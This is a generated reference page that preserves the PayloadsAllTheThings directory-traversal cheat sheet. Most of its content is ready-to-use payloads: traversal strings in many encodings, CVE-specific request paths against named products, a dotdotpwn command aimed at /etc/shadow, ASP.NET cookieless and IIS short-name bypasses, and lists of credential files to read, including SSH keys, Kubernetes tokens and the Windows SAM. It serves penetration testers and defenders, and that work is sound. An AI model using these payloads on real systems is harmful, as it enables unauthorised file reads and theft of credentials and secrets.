---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Directory Traversal

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-directory-traversal-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Directory Traversal/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Directory Traversal](../../topics/directory-traversal/directory-traversal.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-directory-traversal-readme |
| name | Directory Traversal |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md |

## Preserved Source Material

````yaml
_body: "# Directory Traversal\n\n> Path Traversal, also known as Directory Traversal, is a type of security vulnerability\
  \ that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar\
  \ constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.\n\n## Summary\n\
  \n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [URL Encoding](#url-encoding)\n    * [Double URL Encoding](#double-url-encoding)\n\
  \    * [Unicode Encoding](#unicode-encoding)\n    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)\n\
  \    * [Mangled Path](#mangled-path)\n    * [NULL Bytes](#null-bytes)\n    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)\n\
  * [Exploit](#exploit)\n    * [UNC Share](#unc-share)\n    * [ASPNET Cookieless](#asp-net-cookieless)\n    * [IIS Short Name](#iis-short-name)\n\
  \    * [Java URL Protocol](#java-url-protocol)\n* [Path Traversal](#path-traversal)\n    * [Linux Files](#linux-files)\n\
  \    * [Windows Files](#windows-files)\n* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\n* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)\
  \ - The Directory Traversal Fuzzer\n\n    ```powershell\n    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow\
  \ -s -q -b\n    ```\n\n## Methodology\n\nWe can use the `..` characters to access the parent directory, the following strings\
  \ are several encoding that can help you bypass a poorly implemented filter.\n\n```powershell\n../\n..\\\n..\\/\n%2e%2e%2f\n\
  %252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%uff0e%uff0e%u2215\n%uff0e%uff0e%u2216\n```\n\n### URL Encoding\n\n| Character | Encoded\
  \ |\n| --- | -------- |\n| `.` | `%2e` |\n| `/` | `%2f` |\n| `\\` | `%5c` |\n\n**Example:** IPConfigure Orchid Core VMS\
  \ 2.0.5 - Local File Inclusion\n\n```ps1\n{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd\n```\n\
  \n### Double URL Encoding\n\nDouble URL encoding is the process of applying URL encoding twice to a string. In URL encoding,\
  \ special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process\
  \ on the already encoded string.\n\n| Character | Encoded |\n| --- | -------- |\n| `.` | `%252e` |\n| `/` | `%252f` |\n\
  | `\\` | `%255c` |\n\n**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)\n\n```ps1\n{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini\n\
  {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini\n\
  ```\n\n### Unicode Encoding\n\n| Character | Encoded |\n| --- | -------- |\n| `.` | `%u002e` |\n| `/` | `%u2215` |\n| `\\\
  ` | `%u2216` |\n\n**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)\n\n```js\n{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp\n\
  ```\n\n### Overlong UTF-8 Unicode Encoding\n\nThe UTF-8 standard mandates that each codepoint is encoded using the minimum\
  \ number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred\
  \ to as \"overlong\" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between\
  \ codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.\n\n| Character\
  \ | Encoded |\n| --- | -------- |\n| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |\n| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |\n\
  | `\\` | `%c0%5c`, `%c0%80%5c` |\n\n### Mangled Path\n\nSometimes you encounter a WAF which remove the `../` characters\
  \ from the strings, just duplicate them.\n\n```powershell\n..././\n...\\.\\\n```\n\n**Example:**: Mirasys DVMS Workstation\
  \ <=5.12.6\n\n```ps1\n{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini\n```\n\n### NULL Bytes\n\nA null byte\
  \ (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems.\
  \ It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used\
  \ to manipulate or bypass server-side input validation mechanisms.\n\n**Example:** Homematic CCU3 CVE-2019-9726\n\n```js\n\
  {{BaseURL}}/.%00./.%00./etc/passwd\n```\n\n**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575\n\n```js\n{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm\n\
  ```\n\n### Reverse Proxy URL Implementation\n\nNginx treats `/..;/` as a directory while Tomcat treats it as it would treat\
  \ `/../` which allows us to access arbitrary servlets.\n\n```powershell\n..;/\n```\n\n**Example**: Pascom Cloud Phone System\
  \ CVE-2021-45967\n\nA configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat\
  \ server, exposing unintended endpoints.\n\n```js\n{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}\n\
  ```\n\n## Exploit\n\nThese exploits affect mechanism linked to specific technologies.\n\n### UNC Share\n\nA UNC (Universal\
  \ Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories,\
  \ or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported\
  \ by other operating systems.\n\nAn attacker can inject a **Windows** UNC share (`\\\\UNC\\share\\name`) into a software\
  \ system to potentially redirect access to an unintended location or arbitrary file.\n\n```powershell\n\\\\localhost\\c$\\\
  windows\\win.ini\n```\n\nAlso the machine might also authenticate on this remote share, thus sending an NTLM exchange.\n\
  \n### ASP NET Cookieless\n\nWhen cookieless session state is enabled. Instead of relying on a cookie to identify the session,\
  \ ASP.NET modifies the URL by embedding the Session ID directly into it.\n\nFor example, a typical URL might be transformed\
  \ from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`.\
  \ The value within `(S(...))` is the Session ID.\n\n| .NET Version   | URI                        |\n| -------------- |\
  \ -------------------------- |\n| V1.0, V1.1     | /(XXXXXXXX)/               |\n| V2.0+          | /(S(XXXXXXXX))/    \
  \        |\n| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |\n| V2.0+          | ...                        |\n\nWe can use\
  \ this behavior to bypass filtered URLs.\n\n* If your application is in the main folder\n\n    ```ps1\n    /(S(X))/\n  \
  \  /(Y(Z))/\n    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/\n    /(S(X))/admin/(S(X))/main.aspx\n    /(S(x))/b/(S(x))in/Navigator.dll\n\
  \    ```\n\n* If your application is in a subfolder\n\n    ```ps1\n    /MyApp/(S(X))/\n    /admin/(S(X))/main.aspx\n   \
  \ /admin/Foobar/(S(X))/../(S(X))/main.aspx\n    ```\n\n| CVE            | Payload                                      \
  \  |\n| -------------- | ---------------------------------------------- |\n| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx\
  \  |\n| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |\n| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/\
  \ |\n| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |\n\n### IIS Short Name\n\nThe IIS Short Name vulnerability\
  \ exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the\
  \ existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.\n\
  \n* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)\n\n    ```ps1\n    java -jar ./iis_shortname_scanner.jar\
  \ 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'\n    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'\n\
  \    ```\n\n* [bitquark/shortscan](https://github.com/bitquark/shortscan)\n\n    ```ps1\n    shortscan http://example.org/\n\
  \    ```\n\n### Java URL Protocol\n\nJava's URL protocol when `new URL('')` is used allows the format `url:URL`\n\n```powershell\n\
  url:file:///etc/passwd\nurl:http://127.0.0.1:8080\n```\n\n## Path Traversal\n\n### Linux Files\n\n* Operating System and\
  \ Informations\n\n    ```powershell\n    /etc/issue\n    /etc/group\n    /etc/hosts\n    /etc/motd\n    ```\n\n* Processes\n\
  \n    ```ps1\n    /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor\n    /proc/self/environ\n\
  \    /proc/version\n    /proc/cmdline\n    /proc/sched_debug\n    /proc/mounts\n    ```\n\n* Network\n\n    ```ps1\n   \
  \ /proc/net/arp\n    /proc/net/route\n    /proc/net/tcp\n    /proc/net/udp\n    ```\n\n* Current Path\n\n    ```ps1\n  \
  \  /proc/self/cwd/index.php\n    /proc/self/cwd/main.py\n    ```\n\n* Indexing\n\n    ```ps1\n    /var/lib/mlocate/mlocate.db\n\
  \    /var/lib/plocate/plocate.db\n    /var/lib/mlocate.db\n    ```\n\n* Credentials and history\n\n    ```ps1\n    /etc/passwd\n\
  \    /etc/shadow\n    /home/$USER/.bash_history\n    /home/$USER/.ssh/id_rsa\n    /etc/mysql/my.cnf\n    ```\n\n* Kubernetes\n\
  \n    ```ps1\n    /run/secrets/kubernetes.io/serviceaccount/token\n    /run/secrets/kubernetes.io/serviceaccount/namespace\n\
  \    /run/secrets/kubernetes.io/serviceaccount/certificate\n    /var/run/secrets/kubernetes.io/serviceaccount\n    ```\n\
  \n### Windows Files\n\nThe files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making\
  \ them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or\
  \ interesting, they serves well as a proof of concept.\n\n```powershell\nC:\\Windows\\win.ini\nC:\\windows\\system32\\license.rtf\n\
  ```\n\nA list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)\n\
  \n```powershell\nc:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/index.asp\nc:/inetpub/wwwroot/web.config\n\
  c:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system32/inetsrv/metabase.xml\nc:/sysprep.inf\n\
  c:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system volume information/wpsettings.dat\nc:/system32/inetsrv/metabase.xml\n\
  c:/unattend.txt\nc:/unattend.xml\nc:/unattended.txt\nc:/unattended.xml\nc:/windows/repair/sam\nc:/windows/repair/system\n\
  ```\n\n## Labs\n\n* [PortSwigger - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)\n\
  * [PortSwigger - File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)\n\
  * [PortSwigger - File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)\n\
  * [PortSwigger - File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)\n\
  * [PortSwigger - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)\n\
  * [PortSwigger - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)\n\
  \n## References\n\n* [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://web.archive.org/web/20241202163755/https://twitter.com/irsdl/status/1640390106312835072)\n\
  * [CWE-40: Path Traversal: '\\\\UNC\\share\\name\\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://web.archive.org/web/20080115180212/http://cwe.mitre.org:80/data/definitions/40.html)\n\
  * [Directory traversal - Portswigger - March 30, 2019](https://web.archive.org/web/20190330191447/https://portswigger.net/web-security/file-path-traversal)\n\
  * [Directory traversal attack - Wikipedia - August 5, 2024](https://web.archive.org/web/20111013162219/http://en.wikipedia.org:80/wiki/Directory_traversal_attack)\n\
  * [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - November 30, 2023](https://web.archive.org/web/20240323234120/https://youtu.be/YlZGJ28By8U)\n\
  * [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos - June\
  \ 19, 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)\n\
  * [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24,\
  \ 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)\n\
  * [Path Traversal Cheat Sheet: Windows - @HollyGraceful - May 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)\n\
  * [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - June 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))"
_relative_path: Directory Traversal/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Directory Traversal/README.md
````
